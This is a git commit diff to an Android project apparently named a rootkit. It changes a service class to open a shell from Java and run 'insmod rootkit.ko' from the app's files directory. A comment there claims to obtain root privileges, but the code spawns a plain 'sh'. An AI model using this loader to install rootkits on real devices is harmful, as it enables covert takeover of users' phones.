16f9cf660bdb9dc19d33ecf694e5b93776ab6e95
Sharon05 <ssx0405sharpay@163.com>
2017-02-07 22:54:00 +0800

    加载内核模块

--- app/src/main/java/com/wei/rootkit/service/InfoService.java
+++ app/src/main/java/com/wei/rootkit/service/InfoService.java
@@ -4,10 +4,14 @@ import android.app.Activity;
 import android.content.Context;
 import android.util.Log;
 
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
 
 /**
  * Created by sharon on 2017/1/15.
@@ -32,24 +36,62 @@ public class InfoService {
 
         Log.v("TAG", "进入insertModule");
 
-        Process p;
-        //String cmd="su -c " + "\"insmod /data/data/com.wei.rootkit/files/rootkit.ko\"";
-        String[] command={"su","-c","\"insmod /data/data/com.wei.rootkit/files/rootkit.ko\""};
+
+        //String[] command={"su","-c","\"insmod /data/data/com.wei.rootkit/files/rootkit.ko\""};
 
         try {
             // 执行命令
             Log.v("TAG","执行命令");
 
             Runtime runtime=Runtime.getRuntime();
-            p = runtime.exec(command);
-            int exitVal = p.waitFor();
-            Log.v("TAG","执行命令完毕"+exitVal);
+            //获得root权限
+            Process process=runtime.exec("sh");
+            //从Process对象获得输出流
+            OutputStream localOutputStream = process.getOutputStream();
+            DataOutputStream localDataOutputStream = new DataOutputStream(localOutputStream);
+
+            /*
+            InputStream localInputStream = process.getInputStream();
+            DataInputStream localDataInputStream = new DataInputStream(localInputStream);
+            */
+
+            //String cmd="mkdir /data/data/com.wei.rootkit/files/test\n";
+            String cmd="cd /data/data/com.wei.rootkit/files\n";
+            localDataOutputStream.writeBytes(cmd);
+            localDataOutputStream.flush();
+
+            cmd="mkdir testDir\n";
+            localDataOutputStream.writeBytes(cmd);
+            localDataOutputStream.flush();
+
+            cmd="insmod rootkit.ko\n";
+            localDataOutputStream.writeBytes(cmd);
+            localDataOutputStream.flush();
+
+
+            localDataOutputStream.writeBytes("exit\n");
+            localDataOutputStream.flush();
+
+
+            Log.v("TAG","执行命令完毕");
+            int v=process.waitFor();
+
+            /*
+            byte[] buffer = new byte[localInputStream.available()];
+            localInputStream.read(buffer);
+            localInputStream.close();
+            File of = new File("/data/data/com.wei.rootkit/files/logError");
+            of.createNewFile();
+            FileOutputStream os = new FileOutputStream(of);
+            os.write(buffer);
+            os.close();
+            */
 
         } catch (IOException e) {
             Log.v("TAG","IO异常");
             e.printStackTrace();
         } catch (InterruptedException e) {
-            Log.v("TAG","Runtime异常");
+            Log.v("TAG","Interrupted异常");
             e.printStackTrace();
         }
     }
